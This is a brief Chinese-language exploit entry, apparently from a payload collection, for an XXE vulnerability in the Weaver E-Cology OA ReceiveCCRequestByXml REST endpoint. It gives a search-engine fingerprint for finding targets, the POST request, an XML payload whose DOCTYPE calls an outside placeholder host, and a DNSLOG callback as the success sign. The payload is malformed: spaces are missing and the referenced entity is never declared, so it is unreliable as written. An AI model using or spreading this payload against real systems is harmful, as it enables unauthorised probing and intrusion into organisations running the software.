# 泛微E-Cology系统接口ReceiveCCRequestByXml存在XXE漏洞

泛微OA ｜ XXE ｜ —
- **指纹**：`app="泛微-协同商务系统"`
- **请求**：`POST /rest/ofs/ReceiveCCRequestByXml HTTP/1.1`

**Payload**
```
<?xmlversion="1.0"encoding="utf-8"?>
<!DOCTYPEsyscodeSYSTEM"http://xxx.xxxx.com">
<M><syscode>&send;</syscode></M>
```
- **响应特征**：200 DNSLOG回显